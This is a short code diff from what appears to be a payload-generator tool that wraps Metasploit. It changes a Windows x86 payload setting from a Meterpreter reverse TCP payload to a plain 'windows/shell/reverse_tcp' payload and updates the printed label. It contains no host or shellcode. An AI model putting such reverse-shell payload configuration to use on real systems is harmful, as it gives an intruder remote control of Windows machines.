@@ -6,12 +6,12 @@ def Construction():
 
     ARCH = "x86"
     PROTOCOLE = "TCP"
-    TYPE = "Meterpreter"
+    TYPE = "Shell"
     PLATFORM = "Windows"
-    
-    RC_PAYLOAD = "windows/meterpreter/reverse_tcp"
-    
-    print(core.amcolors.PURPLE + core.amcolors.BOLD + "Payload x86 Meterpreter Reverse TCP" + core.amcolors.ENDC)
+
+    RC_PAYLOAD = "windows/shell/reverse_tcp"
+
+    print(core.amcolors.PURPLE + core.amcolors.BOLD + "Payload x86 Shell Reverse TCP" + core.amcolors.ENDC)
 
     Gen_Payload = True
 
